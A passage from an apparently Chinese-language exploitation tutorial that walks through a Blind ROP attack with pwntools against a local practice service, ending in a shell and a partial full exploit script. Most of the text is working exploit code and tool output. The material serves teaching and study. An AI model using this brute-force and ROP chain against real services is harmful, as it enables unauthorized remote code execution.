            <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&quot;bad: 0x</span><span class="si">%x</span><span class="s2">&quot;</span> <span class="o">%</span> <span class="n">addr</span><span class="p">)</span>
        <span class="k">except</span><span class="p">:</span>
            <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&quot;Can&#39;t connect&quot;</span><span class="p">)</span>
            <span class="n">addr</span> <span class="o">-=</span> <span class="mi">1</span>
</pre></div>
由于我们在本地的守护脚本略简陋，在程序挂掉和重新启动之间存在一定的时间差，所以这里 <code>sleep(0.1)</code> 做一定的缓冲，如果还是冲突，在 <code>except</code> 进行处理，后面的代码也一样。
<div class="codehilite"><pre><span></span>[*] stop address: 0x4005e5
</pre></div></p>
<h4 id="common-gadget">common gadget<a class="headerlink" href="#common-gadget" title="Permanent link">&para;</a></h4>
<p>有了 stop gadget，那些原本会导致程序崩溃的地址还是一样会导致崩溃，但那些正常返回的地址则会通过 stop gadget 进入被挂起的状态。下面我们就可以寻找其他可利用的 gadget，由于是 64 位程序，可以考虑使用通用 gadget（有关该内容请参见章节4.7）：
<div class="codehilite"><pre><span></span><span class="k">def</span> <span class="nf">get_gadgets_addr</span><span class="p">(</span><span class="n">buf_size</span><span class="p">,</span> <span class="n">stop_addr</span><span class="p">):</span>
    <span class="n">addr</span> <span class="o">=</span> <span class="n">stop_addr</span>
    <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
        <span class="n">sleep</span><span class="p">(</span><span class="mf">0.1</span><span class="p">)</span>
        <span class="n">addr</span> <span class="o">+=</span> <span class="mi">1</span>
        <span class="n">payload</span>  <span class="o">=</span> <span class="s2">&quot;A&quot;</span><span class="o">*</span><span class="n">buf_size</span>
        <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">addr</span><span class="p">)</span>
        <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">6</span><span class="p">)</span>
        <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">stop_addr</span><span class="p">)</span>
        <span class="k">try</span><span class="p">:</span>
            <span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;127.0.0.1&#39;</span><span class="p">,</span> <span class="mi">10001</span><span class="p">)</span>
            <span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
            <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
            <span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
            <span class="n">p</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
            <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&quot;find address: 0x</span><span class="si">%x</span><span class="s2">&quot;</span> <span class="o">%</span> <span class="n">addr</span><span class="p">)</span>
            <span class="k">try</span><span class="p">:</span>    <span class="c1"># check</span>
                <span class="n">payload</span>  <span class="o">=</span> <span class="s2">&quot;A&quot;</span><span class="o">*</span><span class="n">buf_size</span>
                <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">addr</span><span class="p">)</span>
                <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">6</span><span class="p">)</span>

                <span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;127.0.0.1&#39;</span><span class="p">,</span> <span class="mi">10001</span><span class="p">)</span>
                <span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
                <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
                <span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
                <span class="n">p</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
                <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&quot;bad address: 0x</span><span class="si">%x</span><span class="s2">&quot;</span> <span class="o">%</span> <span class="n">addr</span><span class="p">)</span>
            <span class="k">except</span><span class="p">:</span>
                <span class="n">p</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
                <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&quot;gadget address: 0x</span><span class="si">%x</span><span class="s2">&quot;</span> <span class="o">%</span> <span class="n">addr</span><span class="p">)</span>
                <span class="k">return</span> <span class="n">addr</span>
        <span class="k">except</span> <span class="ne">EOFError</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
            <span class="n">p</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
            <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&quot;bad: 0x</span><span class="si">%x</span><span class="s2">&quot;</span> <span class="o">%</span> <span class="n">addr</span><span class="p">)</span>
        <span class="k">except</span><span class="p">:</span>
            <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&quot;Can&#39;t connect&quot;</span><span class="p">)</span>
            <span class="n">addr</span> <span class="o">-=</span> <span class="mi">1</span>
</pre></div>
直接从 stop gadget 的地方开始搜索就可以了。另外，找到一个正常返回的地址之后，需要进行检查，以确定是它确实是通用 gadget。
<div class="codehilite"><pre><span></span>[*] gadget address: 0x40082a
</pre></div>
有了通用 gadget，就可以得到 <code>pop rdi; ret</code> 的地址了，即 gadget address + 9。</p>
<h4 id="putsplt">puts@plt<a class="headerlink" href="#putsplt" title="Permanent link">&para;</a></h4>
<p>plt 表具有比较规整的结构，每一个表项都是 16 字节，而在每个表项的 6 字节偏移处，是该表项对应函数的解析路径，所以先得到 plt 地址，然后 dump 出内存，就可以找到 got 地址。</p>
<p>这里我们使用 puts 函数来 dump 内存，比起 write，它只需要一个参数，很方便：
<div class="codehilite"><pre><span></span><span class="k">def</span> <span class="nf">get_puts_plt</span><span class="p">(</span><span class="n">buf_size</span><span class="p">,</span> <span class="n">stop_addr</span><span class="p">,</span> <span class="n">gadgets_addr</span><span class="p">):</span>
    <span class="n">pop_rdi</span> <span class="o">=</span> <span class="n">gadgets_addr</span> <span class="o">+</span> <span class="mi">9</span>      <span class="c1"># pop rdi; ret;</span>
    <span class="n">addr</span> <span class="o">=</span> <span class="n">stop_addr</span>
    <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
        <span class="n">sleep</span><span class="p">(</span><span class="mf">0.1</span><span class="p">)</span>
        <span class="n">addr</span> <span class="o">+=</span> <span class="mi">1</span>

        <span class="n">payload</span>  <span class="o">=</span> <span class="s2">&quot;A&quot;</span><span class="o">*</span><span class="n">buf_size</span>
        <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span>
        <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x400000</span><span class="p">)</span>
        <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">addr</span><span class="p">)</span>
        <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">stop_addr</span><span class="p">)</span>
        <span class="k">try</span><span class="p">:</span>
            <span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;127.0.0.1&#39;</span><span class="p">,</span> <span class="mi">10001</span><span class="p">)</span>
            <span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
            <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
            <span class="k">if</span> <span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span><span class="o">.</span><span class="n">startswith</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\x7f</span><span class="s2">ELF&quot;</span><span class="p">):</span>
                <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&quot;puts@plt address: 0x</span><span class="si">%x</span><span class="s2">&quot;</span> <span class="o">%</span> <span class="n">addr</span><span class="p">)</span>
                <span class="n">p</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
                <span class="k">return</span> <span class="n">addr</span>
            <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&quot;bad: 0x</span><span class="si">%x</span><span class="s2">&quot;</span> <span class="o">%</span> <span class="n">addr</span><span class="p">)</span>
            <span class="n">p</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
        <span class="k">except</span> <span class="ne">EOFError</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
            <span class="n">p</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
            <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&quot;bad: 0x</span><span class="si">%x</span><span class="s2">&quot;</span> <span class="o">%</span> <span class="n">addr</span><span class="p">)</span>
        <span class="k">except</span><span class="p">:</span>
            <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&quot;Can&#39;t connect&quot;</span><span class="p">)</span>
            <span class="n">addr</span> <span class="o">-=</span> <span class="mi">1</span>
</pre></div>
这里让 puts 打印出 <code>0x400000</code> 地址处的内容，因为这里通常是程序头的位置（关闭PIE），且前四个字符为 <code>\x7fELF</code>，方便进行验证。
<div class="codehilite"><pre><span></span>[*] puts@plt address: 0x4005e7
</pre></div>
成功找到一个地址，它确实调用 puts，打印出了 <code>\x7fELF</code>，那它真的就是 puts@plt 的地址吗，不一定，看一下呗，反正我们有二进制文件。
<div class="codehilite"><pre><span></span>gdb-peda$ disassemble /r 0x4005f0
Dump of assembler code for function puts@plt:
   0x00000000004005f0 &lt;+0&gt;:     ff 25 22 0a 20 00       jmp    QWORD PTR [rip+0x200a22]        # 0x601018
   0x00000000004005f6 &lt;+6&gt;:     68 00 00 00 00  push   0x0
   0x00000000004005fb &lt;+11&gt;:    e9 e0 ff ff ff  jmp    0x4005e0
End of assembler dump.
</pre></div>
不对呀，puts@plt 明明是在 <code>0x4005f0</code>，那么 <code>0x4005e7</code> 是什么鬼。
<div class="codehilite"><pre><span></span>gdb-peda$ pdisass /r 0x4005e7,0x400600
Dump of assembler code from 0x4005e7 to 0x400600:
   0x00000000004005e7:  25 24 0a 20 00  and    eax,0x200a24
   0x00000000004005ec:  0f 1f 40 00     nop    DWORD PTR [rax+0x0]
   0x00000000004005f0 &lt;puts@plt+0&gt;:     ff 25 22 0a 20 00       jmp    QWORD PTR [rip+0x200a22]        # 0x601018
   0x00000000004005f6 &lt;puts@plt+6&gt;:     68 00 00 00 00  push   0x0
   0x00000000004005fb &lt;puts@plt+11&gt;:    e9 e0 ff ff ff  jmp    0x4005e0
End of assembler dump.
</pre></div>
原来是由于反汇编时候的偏移，导致了这个问题，当然了前两句对后面的 puts 语句并没有什么影响，忽略它，在后面的代码中继续使用 <code>0x4005e7</code>。</p>
<h4 id="remote-dump">remote dump<a class="headerlink" href="#remote-dump" title="Permanent link">&para;</a></h4>
<p>有了 puts，有了 gadget，就可以着手 dump 程序了：
<div class="codehilite"><pre><span></span><span class="k">def</span> <span class="nf">dump_memory</span><span class="p">(</span><span class="n">buf_size</span><span class="p">,</span> <span class="n">stop_addr</span><span class="p">,</span> <span class="n">gadgets_addr</span><span class="p">,</span> <span class="n">puts_plt</span><span class="p">,</span> <span class="n">start_addr</span><span class="p">,</span> <span class="n">end_addr</span><span class="p">):</span>
    <span class="n">pop_rdi</span>  <span class="o">=</span> <span class="n">gadgets_addr</span> <span class="o">+</span> <span class="mi">9</span>     <span class="c1"># pop rdi; ret</span>

    <span class="n">result</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span>
    <span class="k">while</span> <span class="n">start_addr</span> <span class="o">&lt;</span> <span class="n">end_addr</span><span class="p">:</span>
        <span class="c1">#print result.encode(&#39;hex&#39;)</span>
        <span class="n">sleep</span><span class="p">(</span><span class="mf">0.1</span><span class="p">)</span>
        <span class="n">payload</span>  <span class="o">=</span> <span class="s2">&quot;A&quot;</span><span class="o">*</span><span class="n">buf_size</span>
        <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span>
        <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">start_addr</span><span class="p">)</span>
        <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">puts_plt</span><span class="p">)</span>
        <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">stop_addr</span><span class="p">)</span>
        <span class="k">try</span><span class="p">:</span>
            <span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;127.0.0.1&#39;</span><span class="p">,</span> <span class="mi">10001</span><span class="p">)</span>
            <span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
            <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
            <span class="n">data</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="n">timeout</span><span class="o">=</span><span class="mf">0.1</span><span class="p">)</span>      <span class="c1"># timeout makes sure to recive all bytes</span>
            <span class="k">if</span> <span class="n">data</span> <span class="o">==</span> <span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">:</span>
                <span class="n">data</span> <span class="o">=</span> <span class="s2">&quot;</span><span class="se">\x00</span><span class="s2">&quot;</span>
            <span class="k">elif</span> <span class="n">data</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">:</span>
                <span class="n">data</span> <span class="o">=</span> <span class="n">data</span><span class="p">[:</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
            <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&quot;leaking: 0x</span><span class="si">%x</span><span class="s2"> --&gt; </span><span class="si">%s</span><span class="s2">&quot;</span> <span class="o">%</span> <span class="p">(</span><span class="n">start_addr</span><span class="p">,(</span><span class="n">data</span> <span class="ow">or</span> <span class="s1">&#39;&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">&#39;hex&#39;</span><span class="p">)))</span>
            <span class="n">result</span> <span class="o">+=</span> <span class="n">data</span>
            <span class="n">start_addr</span> <span class="o">+=</span> <span class="nb">len</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
            <span class="n">p</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
        <span class="k">except</span><span class="p">:</span>
            <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&quot;Can&#39;t connect&quot;</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">result</span>
</pre></div>
我们知道 puts 函数通过 <code>\x00</code> 进行截断，并且会在每一次输出末尾加上换行符 <code>\x0a</code>，所以有一些特殊情况需要做一些处理，比如单独的 <code>\x00</code>、<code>\x0a</code> 等，首先当然是先去掉末尾 puts 自动加上的 <code>\n</code>，然后如果 recv 到一个 <code>\n</code>，说明内存中是 <code>\x00</code>，如果 recv 到一个 <code>\n\n</code>，说明内存中是 <code>\x0a</code>。<code>p.recv(timeout=0.1)</code> 是由于函数本身的设定，如果有 <code>\n\n</code>，它很可能在收到第一个 <code>\n</code> 时就返回了，加上参数可以让它全部接收完。</p>
<p>这里选择从 <code>0x400000</code> dump到 <code>0x401000</code>，足够了，你还可以 dump 下 data 段的数据，大概从 <code>0x600000</code> 开始。</p>
<h4 id="putsgot">puts@got<a class="headerlink" href="#putsgot" title="Permanent link">&para;</a></h4>
<p>拿到 dump 下来的文件，使用 Radare2 打开，使用参数 <code>-B</code> 指定程序基地址，然后反汇编 <code>puts@plt</code> 的位置 <code>0x4005e7</code>，当然你要直接反汇编 <code>0x4005f0</code> 也行：
<div class="codehilite"><pre><span></span>$ r2 -B 0x400000 code.bin
[0x00400630]&gt; pd 14 @ 0x4005e7
     ::::   0x004005e7      25240a2000     and eax, 0x200a24                                                                                                                          
     ::::   0x004005ec      0f1f4000       nop dword [rax]                                                                                                                            
     ::::   0x004005f0      ff25220a2000   jmp qword [0x00601018]      ; [0x601018:8]=-1                                                                                              
     ::::   0x004005f6      6800000000     push 0                                                                                                                                     
     `====&lt; 0x004005fb      e9e0ffffff     jmp 0x4005e0                                                                                                                               
      :::   0x00400600      ff251a0a2000   jmp qword [0x00601020]      ; [0x601020:8]=-1                                                                                              
      :::   0x00400606      6801000000     push 1                      ; 1                                                                                                            
      `===&lt; 0x0040060b      e9d0ffffff     jmp 0x4005e0                                                                                                                               
       ::   0x00400610      ff25120a2000   jmp qword [0x00601028]      ; [0x601028:8]=-1                                                                                              
       ::   0x00400616      6802000000     push 2                      ; 2                                                                                                            
       `==&lt; 0x0040061b      e9c0ffffff     jmp 0x4005e0                                                                                                                               
        :   0x00400620      ff250a0a2000   jmp qword [0x00601030]      ; [0x601030:8]=-1                                                                                              
        :   0x00400626      6803000000     push 3                      ; 3                                                                                                            
        `=&lt; 0x0040062b      e9b0ffffff     jmp 0x4005e0
</pre></div>
于是我们就得到了 puts@got 地址 <code>0x00601018</code>。可以看到该表中还有其他几个函数，根据程序的功能大概可以猜到，无非就是 setbuf、read 之类的，在后面的过程中如果实在无法确定 libc，这些信息可能会有用。</p>
<h4 id="attack">attack<a class="headerlink" href="#attack" title="Permanent link">&para;</a></h4>
<p>后面的过程和无 libc 的利用差不多了，先使用 puts 打印出其在内存中的地址，然后在 libc-database 里查找相应的 libc，也就是目标机器上的 libc，通过偏移计算出 <code>system()</code> 函数和字符串 <code>/bin/sh</code> 的地址，构造 payload 就可以了。</p>
<p><div class="codehilite"><pre><span></span><span class="k">def</span> <span class="nf">get_puts_addr</span><span class="p">(</span><span class="n">buf_size</span><span class="p">,</span> <span class="n">stop_addr</span><span class="p">,</span> <span class="n">gadgets_addr</span><span class="p">,</span> <span class="n">puts_plt</span><span class="p">,</span> <span class="n">puts_got</span><span class="p">):</span>
    <span class="n">pop_rdi</span>  <span class="o">=</span> <span class="n">gadgets_addr</span> <span class="o">+</span> <span class="mi">9</span>

    <span class="n">payload</span>  <span class="o">=</span> <span class="s2">&quot;A&quot;</span><span class="o">*</span><span class="n">buf_size</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">puts_got</span><span class="p">)</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">puts_plt</span><span class="p">)</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">stop_addr</span><span class="p">)</span>

    <span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;127.0.0.1&#39;</span><span class="p">,</span> <span class="mi">10001</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
    <span class="n">data</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
    <span class="n">data</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">data</span><span class="p">[:</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span> <span class="o">+</span> <span class="s1">&#39;</span><span class="se">\x00\x00</span><span class="s1">&#39;</span><span class="p">)</span>
    <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&quot;puts address: 0x</span><span class="si">%x</span><span class="s2">&quot;</span> <span class="o">%</span> <span class="n">data</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>

    <span class="k">return</span> <span class="n">data</span>
</pre></div>
<div class="codehilite"><pre><span></span>[*] puts address: 0x7ffff7a90210
</pre></div></p>
<p>这里插一下 <a href="https://github.com/niklasb/libc-database">libc-database</a> 的用法，由于我本地的 libc 版本比较新，可能未收录，就直接将它添加进去好了：
<div class="codehilite"><pre><span></span>$ ./add /usr/lib/libc-2.26.so   
Adding local libc /usr/lib/libc-2.26.so (id local-e112b79b632f33fce6908f5ffd2f61a5d8058570  /usr/lib/libc-2.26.so)
  -&gt; Writing libc to db/local-e112b79b632f33fce6908f5ffd2f61a5d8058570.so
  -&gt; Writing symbols to db/local-e112b79b632f33fce6908f5ffd2f61a5d8058570.symbols
  -&gt; Writing version info
</pre></div>
然后查询（ASLR 并不影响后 12 位的值）：
<div class="codehilite"><pre><span></span>$ ./find puts 210
/usr/lib/libc-2.26.so (id local-e112b79b632f33fce6908f5ffd2f61a5d8058570)
$ ./dump local-e112b79b632f33fce6908f5ffd2f61a5d8058570
offset___libc_start_main_ret = 0x20f6a
offset_system = 0x0000000000042010
offset_dup2 = 0x00000000000e8100
offset_read = 0x00000000000e7820
offset_write = 0x00000000000e78c0
offset_str_bin_sh = 0x17aff5
$ ./dump local-e112b79b632f33fce6908f5ffd2f61a5d8058570 puts
offset_puts = 0x000000000006f210
</pre></div></p>
<p><div class="codehilite"><pre><span></span><span class="n">offset_puts</span>   <span class="o">=</span> <span class="mh">0x000000000006f210</span>
<span class="n">offset_system</span> <span class="o">=</span> <span class="mh">0x0000000000042010</span>
<span class="n">offset_str_bin_sh</span> <span class="o">=</span> <span class="mh">0x17aff5</span>

<span class="n">system_addr</span> <span class="o">=</span> <span class="p">(</span><span class="n">puts_addr</span> <span class="o">-</span> <span class="n">offset_puts</span><span class="p">)</span> <span class="o">+</span> <span class="n">offset_system</span>
<span class="n">binsh_addr</span>  <span class="o">=</span> <span class="p">(</span><span class="n">puts_addr</span> <span class="o">-</span> <span class="n">offset_puts</span><span class="p">)</span> <span class="o">+</span> <span class="n">offset_str_bin_sh</span>

<span class="c1"># get shell</span>
<span class="n">payload</span>  <span class="o">=</span> <span class="s2">&quot;A&quot;</span><span class="o">*</span><span class="n">buf_size</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">gadgets_addr</span> <span class="o">+</span> <span class="mi">9</span><span class="p">)</span>    <span class="c1"># pop rdi; ret;</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">binsh_addr</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">system_addr</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">stop_addr</span><span class="p">)</span>

<span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;127.0.0.1&#39;</span><span class="p">,</span> <span class="mi">10001</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</pre></div>
Bingo!!!
<div class="codehilite"><pre><span></span>$ python2 exp.py
[+] Opening connection to 127.0.0.1 on port 10001: Done
[*] Switching to interactive mode
$ whoami
firmy
</pre></div></p>
<h2 id="exploit">Exploit<a class="headerlink" href="#exploit" title="Permanent link">&para;</a></h2>
<p>完整的 exp 如下：
<div class="codehilite"><pre><span></span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="c1">#context.log_level = &#39;debug&#39;</span>

<span class="k">def</span> <span class="nf">get_buffer_size</span><span class="p">():</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">100</span><span class="p">):</span>
        <span class="n">payload</span>  <span class="o">=</span> <span class="s2">&quot;A&quot;</span>
        <span class="n">payload</span> <span class="o">+=</span> <span class="s2">&quot;A&quot;</span><span class="o">*</span><span class="n">i</span>
        <span class="n">buf_size</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span>
        <span class="k">try</span><span class="p">:</span>
            <span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;127.0.0.1&#39;</span><span class="p">,</span> <span class="mi">10001</span><span class="p">)</span>
            <span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
            <span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
            <span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
            <span class="n">p</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
            <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&quot;bad: </span><span class="si">%d</span><span class="s2">&quot;</span> <span class="o">%</span> <span class="n">buf_size</span><span class="p">)</span>
        <span class="k">except</span> <span class="ne">EOFError</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
            <span class="n">p</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
            <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&quot;buffer size: </span><span class="si">%d</span><span class="s2">&quot;</span> <span class="o">%</span> <span class="n">buf_size</span><span class="p">)</span>
            <span class="k">return</span> <span class="n">buf_size</span>

<span class="k">def</span> <span class="nf">get_stop_addr</span><span class="p">(</span><span class="n">buf_size</span><span class="p">):</span>
    <span class="n">addr</span> <span class="o">=</span> <span class="mh">0x400000</span>
    <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
        <span class="n">sleep</span><span class="p">(</span><span class="mf">0.1</span><span class="p">)</span>
        <span class="n">addr</span> <span class="o">+=</span> <span class="mi">1</span>
        <span class="n">payload</span>  <span class="o">=</span> <span class="s2">&quot;A&quot;</span><span class="o">*</span><span class="n">buf_size</span>
        <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">addr</span><span class="p">)</span>
        <span class="k">try</span><span class="p">:</span>
            <span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;127.0.0.1&#39;</span><span class="p">,</span> <span class="mi">10001</span><span class="p">)</span>
            <span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
            <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
            <span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
            <span class="n">p</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
            <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&quot;stop address: 0x</span><span class="si">%x</span><span class="s2">&quot;</span> <span class="o">%</span> <span class="n">addr</span><span class="p">)</span>
            <span class="k">return</span> <span class="n">addr</span>
        <span class="k">except</span> <span class="ne">EOFError</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
            <span class="n">p</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
            <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&quot;bad: 0x</span><span class="si">%x</span><span class="s2">&quot;</span> <span class="o">%</span> <span class="n">addr</span><span class="p">)</span>
        <span class="k">except</span><span class="p">:</span>
            <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&quot;Can&#39;t connect&quot;</span><span class="p">)</span>
            <span class="n">addr</span> <span class="o">-=</span> <span class="mi">1</span>

<span class="k">def</span> <span class="nf">get_gadgets_addr</span><span class="p">(</span><span class="n">buf_size</span><span class="p">,</span> <span class="n">stop_addr</span><span class="p">):</span>
    <span class="n">addr</span> <span class="o">=</span> <span class="n">stop_addr</span>
    <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
        <span class="n">sleep</span><span class="p">(</span><span class="mf">0.1</span><span class="p">)</span>
        <span class="n">addr</span> <span class="o">+=</span> <span class="mi">1</span>
        <span class="n">payload</span>  <span class="o">=</span> <span class="s2">&quot;A&quot;</span><span class="o">*</span><span class="n">buf_size</span>
        <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">addr</span><span class="p">)</span>
